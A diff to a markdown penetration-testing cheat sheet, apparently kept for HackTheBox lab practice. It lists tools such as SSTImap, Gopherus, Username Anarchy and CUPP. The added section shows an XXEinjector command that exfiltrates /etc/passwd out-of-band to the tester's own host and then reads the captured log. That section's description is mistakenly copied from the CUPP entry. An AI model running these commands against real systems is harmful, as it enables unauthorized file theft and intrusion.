@@ -71,10 +71,10 @@ SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
 encoding
 1
 ```
-## Gopherus protocol
+# Gopherus protocol
 [Gopherus](https://github.com/tarunkant/Gopherus)
 
-## SSTI tool
+# SSTI tool
 - Download
 ```bash
 git clone https://github.com/vladko312/SSTImap
@@ -85,7 +85,7 @@ pip3 install -r requirements.txt
 ```bash
 python3 sstimap.py -u http://172.17.0.2/index.php?name=test
 ```
-## Username Anarchy
+# Username Anarchy
 Create own dictionary
 - Download
 ```bash
@@ -96,7 +96,7 @@ cd username-anarchy
 ```bash
 ./username-anarchy Jane Smith > jane_smith_usernames.txt
 ```
-## CUPP
+# CUPP
 Create a more personal dictionary
 - Download
 ```bash
@@ -105,4 +105,19 @@ sudo apt install cupp -y
 - Example
 ```bash
 cupp -i
+```
+
+# Automated OOB Exfiltration
+Create a more personal dictionary
+- Download
+```bash
+git clone https://github.com/enjoiz/XXEinjector.git
+```
+- Example
+```bash
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+```
+- Reading
+```bash
+cat Logs/10.129.201.94/etc/passwd.log
 ```
